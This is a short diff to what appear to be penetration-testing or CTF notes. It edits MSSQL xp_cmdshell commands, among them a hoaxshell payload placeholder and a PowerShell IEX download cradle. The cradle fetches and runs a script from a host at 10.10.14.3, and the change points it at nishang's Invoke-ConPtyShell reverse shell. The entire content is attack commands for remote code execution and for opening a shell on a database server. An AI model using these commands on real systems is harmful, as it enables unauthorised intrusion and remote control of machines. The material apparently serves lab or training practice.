@@ -163,7 +163,8 @@ RECONFIGURE
 xp_cmdshell whoami
 xp_cmdshell "powershell -e <hoaxshell payload>";
 
-xp_cmdshell "powershell IEX(New-Object Net.webclient).downloadString(\"http://10.10.14.3:8000/rv``.ps1\")";
+xp_cmdshell "powershell IEX(New-Object Net.webclient).downloadString(\"http://10.10.14.3:8000/windows/nishang/Shells/Invoke-ConPtyShell.ps1
+\")";
 
 ```
 
